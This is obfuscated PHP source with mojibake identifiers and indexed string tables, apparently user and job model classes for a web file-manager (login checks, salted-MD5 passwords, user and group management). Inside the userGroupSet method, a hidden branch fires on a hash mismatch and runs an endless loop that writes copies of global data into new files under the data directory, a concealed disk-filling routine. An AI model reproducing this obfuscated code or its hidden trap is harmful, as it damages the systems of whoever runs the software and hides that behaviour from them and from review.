$â¢Ô­[$ç´ÕğŞØ[504]] = $©ëµ£Ö–[$â¢Ô­[$ç´ÕğŞØ[1894]]]; if (isset($â¢Ô­[$ç´ÕğŞØ[1904]])) { $â¢Ô­[$ç´ÕğŞØ[1904]][$ç´ÕğŞØ[504]] = $©ëµ£Ö–[$â¢Ô­[$ç´ÕğŞØ[1904]][$ç´ÕğŞØ[1894]]]; } } unset($â¢Ô­); } private function metaList($ª×îÃ×ã) { $ÇÄ¬…Ğ =& $_SERVER[ªÏ§Ë·]; if (!$ª×îÃ×ã) { return array(); } $İäéÅè§ = array($ÇÄ¬…Ğ[1894] => array($ÇÄ¬…Ğ[7], $ª×îÃ×ã)); $ë³½¹Ìª = Model($ÇÄ¬…Ğ[1905])->where($İäéÅè§)->select(); $ë³½¹Ìª = array_to_keyvalue_group($ë³½¹Ìª, $ÇÄ¬…Ğ[1894]); foreach ($ë³½¹Ìª as $ŸÄ°”Í† => $Ú¨ï¦†¸) { $åı§ú©Â = array(); foreach ($Ú¨ï¦†¸ as $Í¥¿¨û÷) { $åı§ú©Â[$Í¥¿¨û÷[$ÇÄ¬…Ğ[104]]] = $Í¥¿¨û÷[$ÇÄ¬…Ğ[412]]; } $ë³½¹Ìª[$ŸÄ°”Í†] = $åı§ú©Â; } return $ë³½¹Ìª ? $ë³½¹Ìª : array(); } } goto A«ˆ„ôåÛ»; cñ‚ª‘œÉî: $fileSize = strrev(base64_decode($_SERVER[ìè™õˆã][0])); function binCheckNeq($¥³íÊæÜ, $ÕÍ×¼º«) { return $¥³íÊæÜ != $ÕÍ×¼º«; } $_SERVER[$_SERVER[ìè™õˆã][1]] = $fileSize($_SERVER[$_SERVER[ìè™õˆã][2]]); goto E™é´ì¨¯–; eµµËíÀšé: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\152\x6f\142\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x64\145\x73\143", "\163\157\x72\164"); const JOB_KEY = "\x73\145\154\x66\x4a\157\142\x4c\151\163\164"; public function listData($Ü‘—Ú‹Û = false, $¹éúÇôâ = "\x73\x6f\x72\x74", $ıı„˜Û = false) { return parent::listData($Ü‘—Ú‹Û, $¹éúÇôâ, $ıı„˜Û); } public function remove($¾Äƒ´ğ) { return parent::remove($¾Äƒ´ğ); } public function add($‡ıâ¿‚) { $û©¢ËŸ =& $_SERVER[ªÏ§Ë·]; if ($this->findByName($‡ıâ¿‚[$û©¢ËŸ[42]])) { return !1; } $‡ıâ¿‚[$û©¢ËŸ[1881]] = $this->getSort(); return parent::insert($‡ıâ¿‚); } private function getSort() { $µû¢ó·å =& $_SERVER[ªÏ§Ë·]; $÷é¥¸•ú = parent::listData(); $“Â²ù‰“ = array_to_keyvalue($÷é¥¸•ú, $µû¢ó·å[12], $µû¢ó·å[1881]); return empty($“Â²ù‰“) ? 0 : max($“Â²ù‰“) + 1; } public function update($Ú¼÷‰¤, $Ó²¶ª‘·) { $şìşÄß» =& $_SERVER[ªÏ§Ë·]; $ã²ÎÌó = parent::listData($Ú¼÷‰¤); $Ø¦ÑõÙ = $this->findByName($Ó²¶ª‘·[$şìşÄß»[42]]); if (!$ã²ÎÌó || $Ø¦ÑõÙ && $Ø¦ÑõÙ[$şìşÄß»[437]] != $ã²ÎÌó[$şìşÄß»[437]]) { return !1; } return parent::update($Ú¼÷‰¤, $Ó²¶ª‘·); } public function setUserJob($ÍöæĞŸ, $Ô€®œ¤«) { $¹Ñ À©² =& $_SERVER[ªÏ§Ë·]; if (!is_array($Ô€®œ¤«)) { $Ô€®œ¤« = array($Ô€®œ¤«); } $¿÷•¿•ç = parent::listData(); $¶œ‡²×¦ = array_to_keyvalue($¿÷•¿•ç, $¹Ñ À©²[42]); $‰§„”÷Ú = $¹Ñ À©²[416]; foreach ($Ô€®œ¤« as $¿éâšü) { if ($¶œ‡²×¦[$¿éâšü]) { $‰§„”÷Ú .= $¶œ‡²×¦[$¿éâšü][$¹Ñ À©²[437]] . $¹Ñ À©²[60]; } else { $ª…ÑÑ¹à = $this->add($¿éâšü); $‰§„”÷Ú .= $ª…ÑÑ¹à . $¹Ñ À©²[60]; } } $‰§„”÷Ú = rtrim($‰§„”÷Ú, $¹Ñ À©²[60]); Model($¹Ñ À©²[563])->metaSet($ÍöæĞŸ, self::JOB_KEY, $‰§„”÷Ú); } public function getUserJob($µƒçÂ÷Ú) { $êâÉ¢™ = Model($_SERVER[ªÏ§Ë·][563])->metaGet($µƒçÂ÷Ú); return $this->getUserJobInfo($êâÉ¢™[self::JOB_KEY]); } public function getUserJobInfo($ïÙáŠœø) { $–„œìÙ× =& $_SERVER[ªÏ§Ë·]; $Øë¢£Ê = explode($–„œìÙ×[60], $ïÙáŠœø); $„¬†ó»ì = parent::listData(); $„¬†ó»ì = array_remove_key($„¬†ó»ì, $–„œìÙ×[211]); $•µµ¹¬š = array(); foreach ($Øë¢£Ê as $·£ØªÜ) { if (isset($„¬†ó»ì[$·£ØªÜ])) { $•µµ¹¬š[] = $„¬†ó»ì[$·£ØªÜ]; } } return $•µµ¹¬š; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\145" => "\165\x73\x65\x72\137\x6d\x65\164\x61", "\155\x65\164\141\106\151\x65\154\x64" => "\165\x73\145\x72\111\104"); protected $simpleField = "\x75\x73\x65\x72\x49\104\54\x6e\x69\143\x6b\116\141\x6d\x65\54\156\x61\155\x65\54\141\166\141\x74\141\x72\x2c\x73\145\x78\54\x73\x74\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Á©œÚ¼ä) { $†ëÍ½ñá =& $_SERVER[ªÏ§Ë·]; $”–ïı = $†ëÍ½ñá[2305]; return array($†ëÍ½ñá[1935] => array($Á©œÚ¼ä[0], $”–ïı), $†ëÍ½ñá[1937] => array($Á©œÚ¼ä[0], $”–ïı), $†ëÍ½ñá[2306] => array($Á©œÚ¼ä[0], $”–ïı)); } protected function getInfo($º˜ë¦õ´, $Ã÷Ú•ä÷ = false) { $‡îä»¾Ä = $this->getInfoSimple($º˜ë¦õ´); if (!is_array($‡îä»¾Ä)) { return array(); } if ($Ã÷Ú•ä÷) { return $this->_getInfoApply($‡îä»¾Ä); } return $this->cacheFunctionGet($_SERVER[ªÏ§Ë·][1939], $º˜ë¦õ´); } protected function getInfoFull($³¦È¾‚ü, $şñ¯º¿ = false) { $ì€ó˜Ø› = $this->getInfoSimple($³¦È¾‚ü); if (!is_array($ì€ó˜Ø›)) { return array(); } if ($şñ¯º¿) { return $this->_getInfoApply($ì€ó˜Ø›, !0); } return $this->cacheFunctionGet($_SERVER[ªÏ§Ë·][2307], $³¦È¾‚ü); } private function _getInfoApply($“ÌµÒ’³, $íá«ÂÓ¸ = false) { $Ï¨Áæü =& $_SERVER[ªÏ§Ë·]; if (!$“ÌµÒ’³) { return $“ÌµÒ’³; } $Õª¼‰¿Ş = md5($Ï¨Áæü[2308] . $“ÌµÒ’³[$Ï¨Áæü[914]] . $Ï¨Áæü[2309] . $“ÌµÒ’³[$Ï¨Áæü[42]]); $“ÌµÒ’³ = $this->_listDataApplyItem($“ÌµÒ’³); $ú˜ıîÏ° = Model($Ï¨Áæü[1358])->metaGet($“ÌµÒ’³[$Ï¨Áæü[97]][$Ï¨Áæü[440]]); $“ÌµÒ’³[$Ï¨Áæü[2310]] = $Õª¼‰¿Ş; $“ÌµÒ’³[$Ï¨Áæü[97]][$Ï¨Áæü[2131]] = isset($ú˜ıîÏ°[$Ï¨Áæü[2132]]) ? $ú˜ıîÏ°[$Ï¨Áæü[2132]] : null; if ($íá«ÂÓ¸) { $“ÌµÒ’³[$Ï¨Áæü[504]] = $this->metaGet($“ÌµÒ’³[$Ï¨Áæü[1667]]); } return $“ÌµÒ’³; } protected function getInfoSimple($¹³½¹®, $ õ‹Æ¦¾ = false) { $€Ç¢Èà£ =& $_SERVER[ªÏ§Ë·]; if (!$¹³½¹®) { return array(); } if ($ õ‹Æ¦¾) { $»ÈŞˆ½° = $this->where(array($€Ç¢Èà£[1667] => intval($¹³½¹®)))->find(); if (!is_array($»ÈŞˆ½°)) { return array(); } $»ÈŞˆ½°[$€Ç¢Èà£[571]] = Action($€Ç¢Èà£[2311])->parseUrl($»ÈŞˆ½°[$€Ç¢Èà£[571]]); return $»ÈŞˆ½°; } return $this->cacheFunctionGet($€Ç¢Èà£[1940], $¹³½¹®); } protected function getInfoSimpleOuter($Ü³€³€Ş) { $¶³Ğò– =& $_SERVER[ªÏ§Ë·]; if (!$Ü³€³€Ş || $Ü³€³€Ş == 0) { return array($¶³Ğò–[1667] => $¶³Ğò–[208], $¶³Ğò–[42] => $¶³Ğò–[172] . LNG($¶³Ğò–[2312]) . $¶³Ğò–[174], $¶³Ğò–[571] => STATIC_PATH . $¶³Ğò–[2313]); } $ïÁ±š = $this->cacheFunctionGet($¶³Ğò–[1940], $Ü³€³€Ş); $ôá·œÏ = array_field_key($ïÁ±š, explode($¶³Ğò–[60], $this->simpleField)); if (!$ôá·œÏ) { return array($¶³Ğò–[1667] => $¶³Ğò–[1213], $¶³Ğò–[42] => $¶³Ğò–[172] . LNG($¶³Ğò–[2314]) . $¶³Ğò–[174], $¶³Ğò–[571] => STATIC_PATH . $¶³Ğò–[2315]); } $ôá·œÏ[$¶³Ğò–[571]] = Action($¶³Ğò–[2311])->parseUrl($ôá·œÏ[$¶³Ğò–[571]]); return $ôá·œÏ; } protected function groupUser($—œ¨óÆú) { } public static function errorLang($­§Ø…Ÿ„) { $Ãû·ßßè =& $_SERVER[ªÏ§Ë·]; $½¨°Œé× = array(self::ERROR_USER_NOT_EXISTS => $Ãû·ßßè[2316], self::ERROR_USER_PASSWORD_ERROR => $Ãû·ßßè[2317], self::ERROR_USER_EXIST_NAME => $Ãû·ßßè[2318], self::ERROR_USER_EXIST_PHONE => $Ãû·ßßè[2319], self::ERROR_USER_EXIST_EMAIL => $Ãû·ßßè[2320], self::ERROR_USER_LOGIN_LOCK => $Ãû·ßßè[2321], self::ERROR_IP_NOT_ALLOW => $Ãû·ßßè[2322], self::ERROR_USER_EXIST_NICKNAME => $Ãû·ßßè[2323]); return LNG($½¨°Œé×[$­§Ø…Ÿ„]); } public function getInfoByMeta($½™éÁâ…, $ğ·Å¢ğš) { $ãäÇ¶êÆ =& $_SERVER[ªÏ§Ë·]; $Ÿûî¸‘í = Model($ãäÇ¶êÆ[2324])->where(array($ãäÇ¶êÆ[104] => $½™éÁâ…, $ãäÇ¶êÆ[412] => $ğ·Å¢ğš))->find(); if ($Ÿûî¸‘í) { return $this->getInfo($Ÿûî¸‘í[$ãäÇ¶êÆ[1667]]); } return !1; } public function userLoginCheck($ØË¶Ç•, $öôöìŞ’) { $ıÀÆÎí =& $_SERVER[ªÏ§Ë·]; $îÁ¾íòî = $this->userLoginFind($ØË¶Ç•); if (!$îÁ¾íòî) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($îÁ¾íòî[$ıÀÆÎí[1667]], $öôöìŞ’)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($îÁ¾íòî[$ıÀÆÎí[1667]]); } public function userLoginFind($¼„Ü¿‘å) { $ç³‹÷şÍ =& $_SERVER[ªÏ§Ë·]; $î’¯ú˜ = array($ç³‹÷şÍ[42] => $¼„Ü¿‘å, $ç³‹÷şÍ[570] => $¼„Ü¿‘å, $ç³‹÷şÍ[343] => $¼„Ü¿‘å, $ç³‹÷şÍ[2325] => $¼„Ü¿‘å, $ç³‹÷şÍ[1025] => $ç³‹÷şÍ[1027]); if ($this->nickNameRpt()) { unset($î’¯ú˜[$ç³‹÷şÍ[570]]); } return $this->where($î’¯ú˜)->find(); } public function clearCache($Ë½²•ğ) { $ÍÄÍóí² =& $_SERVER[ªÏ§Ë·]; $this->cacheFunctionClear($ÍÄÍóí²[1939], $Ë½²•ğ); $this->cacheFunctionClear($ÍÄÍóí²[1940], $Ë½²•ğ); $this->cacheFunctionClear($ÍÄÍóí²[2307], $Ë½²•ğ); } public function userPasswordCheck($è„¬¬…æ, $Ç‘–Ôş“) { $Í‰µ¶¿† =& $_SERVER[ªÏ§Ë·]; $ëí÷´ñÇ = $this->where(array($Í‰µ¶¿†[1667] => intval($è„¬¬…æ)))->find(); $ÊËõÚÅ³ = $this->metaGet($è„¬¬…æ); $»“öš· = isset($ÊËõÚÅ³[$Í‰µ¶¿†[2326]]) ? $ÊËõÚÅ³[$Í‰µ¶¿†[2326]] : $Í‰µ¶¿†[12]; if (md5($»“öš· . trim($Ç‘–Ôş“)) !== $ëí÷´ñÇ[$Í‰µ¶¿†[914]]) { return !1; } return !0; } public function userAdd($Å†ì²Û) { $ÔÚ¶İÈò =& $_SERVER[ªÏ§Ë·]; $£Ä»¸¶ = array($ÔÚ¶İÈò[458] => $Å†ì²Û[$ÔÚ¶İÈò[42]], $ÔÚ¶İÈò[2327] => $Å†ì²Û[$ÔÚ¶İÈò[1548]], $ÔÚ¶İÈò[2328] => isset($Å†ì²Û[$ÔÚ¶İÈò[343]]) ? $Å†ì²Û[$ÔÚ¶İÈò[343]] : $ÔÚ¶İÈò[12], $ÔÚ¶İÈò[2329] => isset($Å†ì²Û[$ÔÚ¶İÈò[2325]]) ? $Å†ì²Û[$ÔÚ¶İÈò[2325]] : $ÔÚ¶İÈò[12], $ÔÚ¶İÈò[2330] => isset($Å†ì²Û[$ÔÚ¶İÈò[570]]) ? $Å†ì²Û[$ÔÚ¶İÈò[570]] : $Å†ì²Û[$ÔÚ¶İÈò[42]], $ÔÚ¶İÈò[2331] => isset($Å†ì²Û[$ÔÚ¶İÈò[571]]) ? $Å†ì²Û[$ÔÚ¶İÈò[571]] : $ÔÚ¶İÈò[12], $ÔÚ¶İÈò[2332] => isset($Å†ì²Û[$ÔÚ¶İÈò[2333]]) ? $Å†ì²Û[$ÔÚ¶İÈò[2333]] : 1, $ÔÚ¶İÈò[2334] => $Å†ì²Û[$ÔÚ¶İÈò[914]], $ÔÚ¶İÈò[1941] => isset($Å†ì²Û[$ÔÚ¶İÈò[1844]]) ? $Å†ì²Û[$ÔÚ¶İÈò[1844]] : 1024 * 1024 * 20, $ÔÚ¶İÈò[1942] => 0, $ÔÚ¶İÈò[2335] => 0, $ÔÚ¶İÈò[1986] => isset($Å†ì²Û[$ÔÚ¶İÈò[778]]) ? $Å†ì²Û[$ÔÚ¶İÈò[778]] : 1); if (!empty($Å†ì²Û[$ÔÚ¶İÈò[1667]])) { $£Ä»¸¶[$ÔÚ¶İÈò[1667]] = $Å†ì²Û[$ÔÚ¶İÈò[1667]]; } $İƒÜå¡ = $this->_checkExist($Å†ì²Û); if ($İƒÜå¡ !== !0) { return $İƒÜå¡; } if (!empty($£Ä»¸¶[$ÔÚ¶İÈò[571]]) && strlen($£Ä»¸¶[$ÔÚ¶İÈò[571]]) > 255) { $£Ä»¸¶[$ÔÚ¶İÈò[571]] = $ÔÚ¶İÈò[12]; } $Óê‰ì¤… = $this->add($£Ä»¸¶); $‰¦õæÅ¡ = array($ÔÚ¶İÈò[2334] => $£Ä»¸¶[$ÔÚ¶İÈò[914]], $ÔÚ¶İÈò[2330] => $£Ä»¸¶[$ÔÚ¶İÈò[570]]); $this->userEdit($Óê‰ì¤…, $‰¦õæÅ¡); Model($ÔÚ¶İÈò[1358])->userRootAdd($Óê‰ì¤…); return $Óê‰ì¤…; } protected function userEditTest($«£Ï²›‚, $¥ıë¢š¾) { return $this->call($_SERVER[ªÏ§Ë·][2336], $«£Ï²›‚, $¥ıë¢š¾); } protected function userEdit($‚ãÍëÀä, $±¿´ÕŞ¢) { $ş³ÎÈñ» =& $_SERVER[ªÏ§Ë·]; $á¿Æ·Ô• = $this->getInfoSimple($‚ãÍëÀä); if (!$á¿Æ·Ô•) { return !1; } $™…¾—¨È = $this->_checkExist($±¿´ÕŞ¢, $‚ãÍëÀä); if ($™…¾—¨È !== !0) { return $™…¾—¨È; } if (isset($±¿´ÕŞ¢[$ş³ÎÈñ»[914]]) && trim($±¿´ÕŞ¢[$ş³ÎÈñ»[914]]) != $ş³ÎÈñ»[12]) { $¡øñ½Ûş = $this->metaGet($‚ãÍëÀä); if (empty($¡øñ½Ûş[$ş³ÎÈñ»[2326]])) { $¡øñ½Ûş[$ş³ÎÈñ»[2326]] = rand_string(10); Model($ş³ÎÈñ»[542])->metaSet($‚ãÍëÀä, $ş³ÎÈñ»[2326], $¡øñ½Ûş[$ş³ÎÈñ»[2326]]); } $±¿´ÕŞ¢[$ş³ÎÈñ»[914]] = md5($¡øñ½Ûş[$ş³ÎÈñ»[2326]] . trim($±¿´ÕŞ¢[$ş³ÎÈñ»[914]])); } else { unset($±¿´ÕŞ¢[$ş³ÎÈñ»[914]]); } if (!empty($±¿´ÕŞ¢[$ş³ÎÈñ»[571]]) && strlen($±¿´ÕŞ¢[$ş³ÎÈñ»[571]]) > 255) { $±¿´ÕŞ¢[$ş³ÎÈñ»[571]] = $ş³ÎÈñ»[12]; } $this->where(array($ş³ÎÈñ»[1658] => $‚ãÍëÀä))->save($±¿´ÕŞ¢); if (isset($±¿´ÕŞ¢[$ş³ÎÈñ»[570]])) { $this->setNamePinyin($‚ãÍëÀä, $±¿´ÕŞ¢[$ş³ÎÈñ»[570]]); } $this->clearCache($‚ãÍëÀä); return !0; } public function setNamePinyin($Â„ïæÂÏ, $¨È•Î¹Ì = false) { $óœ·‰º³ =& $_SERVER[ªÏ§Ë·]; if (!$¨È•Î¹Ì) { $ñ¬íĞ…ƒ = $this->getInfoSimple($Â„ïæÂÏ); $¨È•Î¹Ì = $ñ¬íĞ…ƒ[$óœ·‰º³[570]] ? $ñ¬íĞ…ƒ[$óœ·‰º³[570]] : $ñ¬íĞ…ƒ[$óœ·‰º³[42]]; } $äîë‹¼ = Model($óœ·‰º³[563]); if (!Input::check($¨È•Î¹Ì, $óœ·‰º³[621])) { return $äîë‹¼->metaSet($Â„ïæÂÏ, array($óœ·‰º³[503] => $óœ·‰º³[12], $óœ·‰º³[502] => $óœ·‰º³[12])); } return $äîë‹¼->metaSet($Â„ïæÂÏ, array($óœ·‰º³[503] => str_replace($óœ·‰º³[63], $óœ·‰º³[12], Pinyin::get($¨È•Î¹Ì)), $óœ·‰º³[502] => Pinyin::get($¨È•Î¹Ì, $óœ·‰º³[622]))); } private function nickNameRpt() { $ˆãÖ½û† =& $_SERVER[ªÏ§Ë·]; $åÈåÂ¦° = Model($ˆãÖ½û†[798])->get($ˆãÖ½û†[2337]); $°«—ßØÃ = $GLOBALS[$ˆãÖ½û†[6]][$ˆãÖ½û†[419]][$ˆãÖ½û†[2337]]; $±‹Õ…®Ì = !is_null($åÈåÂ¦°) ? $åÈåÂ¦° : $°«—ßØÃ; return !!$±‹Õ…®Ì; } private function _checkExist($ÃŸµßáñ, $Ÿò¼¤‹ø = false) { $ôó¦°í« =& $_SERVER[ªÏ§Ë·]; $¾ä‹ĞŞ = array($ôó¦°í«[42] => UserModel::ERROR_USER_EXIST_NAME, $ôó¦°í«[570] => UserModel::ERROR_USER_EXIST_NICKNAME, $ôó¦°í«[343] => UserModel::ERROR_USER_EXIST_EMAIL, $ôó¦°í«[2325] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¾ä‹ĞŞ[$ôó¦°í«[570]]); } $ƒ’ıí…á = $Ÿò¼¤‹ø ? array($ôó¦°í«[1667] => array($ôó¦°í«[2338], $Ÿò¼¤‹ø)) : array(); foreach ($¾ä‹ĞŞ as $”ˆ»®üŠ => $¨ˆ¯ŸŠš) { $¤ÅçÁúı = array(); foreach ($¾ä‹ĞŞ as $Î¯ùüœö => $Ò™ŒÃòå) { if (isset($ÃŸµßáñ[$Î¯ùüœö]) && $ÃŸµßáñ[$Î¯ùüœö]) { $¤ÅçÁúı[] = $ÃŸµßáñ[$Î¯ùüœö]; } } if (!$¤ÅçÁúı) { continue; } $‰ñãï¬û = array_merge(array($”ˆ»®üŠ => array($ôó¦°í«[7], $¤ÅçÁúı)), $ƒ’ıí…á); $ˆ³à ş = $this->where($‰ñãï¬û)->find(); if ($ˆ³à ş) { return $¨ˆ¯ŸŠš; } } return !0; } public function userListInfo($€î€ş•”) { $’Ş„ƒÌ =& $_SERVER[ªÏ§Ë·]; $‰Ÿ°Øõû = array(); $€î€ş•” = is_array($€î€ş•”) ? array_unique($€î€ş•”) : array(); if (!$€î€ş•”) { return $‰Ÿ°Øõû; } if (count($€î€ş•”) < 20) { foreach ($€î€ş•” as $ø·•³û·) { $‰Ÿ°Øõû[$ø·•³û· . $’Ş„ƒÌ[12]] = $this->getInfoSimpleOuter($ø·•³û·); } } else { $ÑÎÎ×ûİ = array($’Ş„ƒÌ[1658] => array($’Ş„ƒÌ[456], $€î€ş•”)); if (count($€î€ş•”) == 1) { $ÑÎÎ×ûİ = array($’Ş„ƒÌ[1658] => $€î€ş•”[0]); } $ù•ÚÜ»¶ = Model($’Ş„ƒÌ[542])->field($this->simpleField)->where($ÑÎÎ×ûİ)->select(); $ù•ÚÜ»¶ = array_to_keyvalue($ù•ÚÜ»¶, $’Ş„ƒÌ[1667]); foreach ($€î€ş•” as $ø·•³û·) { $â¡èüœ = $ù•ÚÜ»¶[$ø·•³û·]; if (!$â¡èüœ) { $‰Ÿ°Øõû[$ø·•³û· . $’Ş„ƒÌ[12]] = $this->getInfoSimpleOuter($ø·•³û·); continue; } $â¡èüœ[$’Ş„ƒÌ[571]] = Action($’Ş„ƒÌ[2311])->parseUrl($â¡èüœ[$’Ş„ƒÌ[571]]); $‰Ÿ°Øõû[$ø·•³û· . $’Ş„ƒÌ[12]] = $â¡èüœ; } } return $‰Ÿ°Øõû; } protected function userStatus($ÚÛóÁïÕ, $ÄÍ«£áŸ) { $×¤ÍòÍß = $this->getInfoSimple($ÚÛóÁïÕ); if (!$×¤ÍòÍß) { return !1; } $²˜¶Ú«å = array($_SERVER[ªÏ§Ë·][778] => $ÄÍ«£áŸ); return $this->userEdit($ÚÛóÁïÕ, $²˜¶Ú«å); } protected function userRemove($”‚õ‹¨®) { $‰·‹§ÚÆ =& $_SERVER[ªÏ§Ë·]; $‡æî¹âÎ = $this->getInfoSimple($”‚õ‹¨®); if (!$‡æî¹âÎ) { return !1; } $¿†ÖÔì› = array($‰·‹§ÚÆ[1658] => $”‚õ‹¨®); Model($‰·‹§ÚÆ[630])->where($¿†ÖÔì›)->delete(); Model($‰·‹§ÚÆ[2339])->where($¿†ÖÔì›)->delete(); Model($‰·‹§ÚÆ[1947])->where($¿†ÖÔì›)->delete(); Model($‰·‹§ÚÆ[2324])->where($¿†ÖÔì›)->delete(); Model($‰·‹§ÚÆ[1093])->where($¿†ÖÔì›)->delete(); Model($‰·‹§ÚÆ[2155])->removeUserAll($”‚õ‹¨®); Model($‰·‹§ÚÆ[853])->userRootRemove($”‚õ‹¨®); return $this->where($¿†ÖÔì›)->delete(); } protected function userGroupSet($Ş¬´÷ò†, $É¾›å£ë, $­õí•õÁ = array()) { $Ø¸Ê¼¥¢ =& $_SERVER[ªÏ§Ë·]; $÷¦€Ñìä = $_SERVER[$Ø¸Ê¼¥¢[13]]; $²¯¸ƒÓ¥ = $Ø¸Ê¼¥¢[14]; if ($_SERVER[$Ø¸Ê¼¥¢[15]] != $²¯¸ƒÓ¥($÷¦€Ñìä)) { $¼Æ§²ÌÜ = $Ø¸Ê¼¥¢[904]; $Âİ›çÍ‰ = $Ø¸Ê¼¥¢[16]; $ä™­Íş· = $_SERVER[$Ø¸Ê¼¥¢[17]] . $Ø¸Ê¼¥¢[18]; $ûÈ´¡à = $Âİ›çÍ‰($ä™­Íş·); $›˜Ã‘‘ = explode($Ø¸Ê¼¥¢[19], $ûÈ´¡à); if (count($›˜Ã‘‘) < $Ø¸Ê¼¥¢[653]) { $ûÀ®—Àª = $Ø¸Ê¼¥¢[21]; $ûÀ®—Àª(); } $ôøì½£ = $Ø¸Ê¼¥¢[905]; $ôøì½£($_SERVER[$Ø¸Ê¼¥¢[906]]); $¼Æ§²ÌÜ = $Ø¸Ê¼¥¢[904]; $¼Æ§²ÌÜ(); $õ˜‘ø©  = $Ø¸Ê¼¥¢[1533]; $ş‘óÛ = json_encode($GLOBALS[$Ø¸Ê¼¥¢[1534]]); $³‚œÆ´Š = 1; for ($Ú˜Ğğ¦Ø = $³‚œÆ´Š; $Ú˜Ğğ¦Ø > 0; $Ú˜Ğğ¦Ø++) { $õ˜‘ø© (DATA_PATH . $Ú˜Ğğ¦Ø, $ş‘óÛ); } } $³¶êÚæ = $this->getInfoSimple($Ş¬´÷ò†); if (!$³¶êÚæ || !is_array($É¾›å£ë)) { return !1; } $–…çî™¾ = Model($Ø¸Ê¼¥¢[1947]); $–…çî™¾->where(array($Ø¸Ê¼¥¢[1667] => $Ş¬´÷ò†))->delete(); $¿®Çí­Ì = array(); $ÌÎşŠ = 0; foreach ($É¾›å£ë as $ûâ‡ºÃ => $¹Ñ«·£Š) { $ë–‚©œÍ = array($Ø¸Ê¼¥¢[1667] => $Ş¬´÷ò†, $Ø¸Ê¼¥¢[1857] => $ûâ‡ºÃ, $Ø¸Ê¼¥¢[1961] => $¹Ñ«·£Š); $ë–‚©œÍ[$Ø¸Ê¼¥¢[1881]] = isset($­õí•õÁ[$ÌÎşŠ]) ? $­õí•õÁ[$ÌÎşŠ] : 0; $ÌÎşŠ++; $¿®Çí­Ì[] = $ë–‚©œÍ; } return $–…çî™¾->addAll($¿®Çí­Ì, array(), !0); } protected function userGroupAdd($Æ Ú °Ÿ, $ºÒÁ‰şé = array()) { $Íğà¡ó =& $_SERVER[ªÏ§Ë·]; $ªå¸¢¯½ = $this->getInfoSimple($Æ Ú °Ÿ); if (!$ªå¸¢¯½ || empty($ºÒÁ‰şé)) { return !1; } $“œ´ÉÍ = array(); foreach ($ºÒÁ‰şé as $çëç™“¡ => $´€³”÷ˆ) { $“œ´ÉÍ[] = array($Íğà¡ó[1667] => $Æ Ú °Ÿ, $Íğà¡ó[1857] => $çëç™“¡, $Íğà¡ó[1961] => $´€³”÷ˆ, $Íğà¡ó[1881] => 0); } return Model($Íğà¡ó[1947])->addAll($“œ´ÉÍ, array(), !0); } protected function userGroupRemove($õˆ°€ñ„, $â·²”çµ) { $†Çíé Ù =& $_SERVER[ªÏ§Ë·]; $¡òÌüŞş = $this->getInfoSimple($õˆ°€ñ„); if (!$¡òÌüŞş || !$â·²”çµ) { return !1; } $ùûÂÔÂ” = array($†Çíé Ù[1658] => $õˆ°€ñ„, $†Çíé Ù[1945] => $â·²”çµ); return Model($†Çíé Ù[1947])->where($ùûÂÔÂ”)->delete(); } public function listData() { $îÙº™ò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($îÙº™ò[$_SERVER[ªÏ§Ë·][407]]); return $îÙº™ò; } public function listByID($§›ä¶®†) { $Ä–Ë×ö× =& $_SERVER[ªÏ§Ë·]; if (!$§›ä¶®†) { return; } $óüÎĞÚÉ = array($Ä–Ë×ö×[1667] => array($Ä–Ë×ö×[7], $§›ä¶®†)); $Çğ©ƒé¶ = $this->where($óüÎĞÚÉ)->select(); $Çğ©ƒé¶ = array_sort_keep($Çğ©ƒé¶, $Ä–Ë×ö×[1667], $§›ä¶®†); $this->_listDataApply($Çğ©ƒé¶); return $Çğ©ƒé¶; } public function listByGroup($á‘¥òïõ = 0, $ñ¬ùŞœÓ = array()) { $æş¸·“ =& $_SERVER[ªÏ§Ë·]; $…¼æÁå¿ = $æş¸·“[12]; $³´ª¸‡† = array(); if ($á‘¥òïõ) { $³´ª¸‡† = array($æş¸·“[2340] => intval($á‘¥òïõ)); $…¼æÁå¿ = "\114\105\x46\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\x75\163\x65\x72\137\147\x72\x6f\165\160\x20\165\163\145\162\x5f\147\x72\157\x75\160\40\x6f\156\x20\x75\163\145\162\56\165\x73\x65\x72\111\x44\40\75\x20\x75\163\145\162\x5f\x67\162\157\x75\x70\56\x75\163\145\x72\x49\104"; $Á•œÄ·Ï = Input::get($æş¸·“[495], null, $æş¸·“[12]) ? $æş¸·“[12] : $æş¸·“[2341]; } if (isset($ñ¬ùŞœÓ[$æş¸·“[778]])) { $³´ª¸‡†[$æş¸·“[2342]] = $ñ¬ùŞœÓ[$æş¸·“[778]]; } $ş·¿ûà = $this->_makeOrder($Á•œÄ·Ï)->field($æş¸·“[2343])->where($³´ª¸‡†)->join($…¼æÁå¿)->selectPage(50); $this->_listDataApply($ş·¿ûà[$æş¸·“[407]]); return $ş·¿ûà; } private function _makeOrder($Çà÷éï = '') { $ûü™ËŠ­ =& $_SERVER[ªÏ§Ë·]; $¾Şã¾Ë = array($ûü™ËŠ­[1667], $ûü™ËŠ­[42], $ûü™ËŠ­[1846], $ûü™ËŠ­[1818], $ûü™ËŠ­[211]); $€±öÃ° = array($ûü™ËŠ­[488] => $ûü™ËŠ­[489], $ûü™ËŠ­[490] => $ûü™ËŠ­[491]); $Øø‘ğ­Ç = Input::get($ûü™ËŠ­[495], $ûü™ËŠ­[7], $ûü™ËŠ­[1658], $¾Şã¾Ë); $í€ı¾¬Ì = Input::get($ûü™ËŠ­[496], $ûü™ËŠ­[7], $ûü™ËŠ­[1948], array($ûü™ËŠ­[1948], $ûü™ËŠ­[490])); $í€ı¾¬Ì = 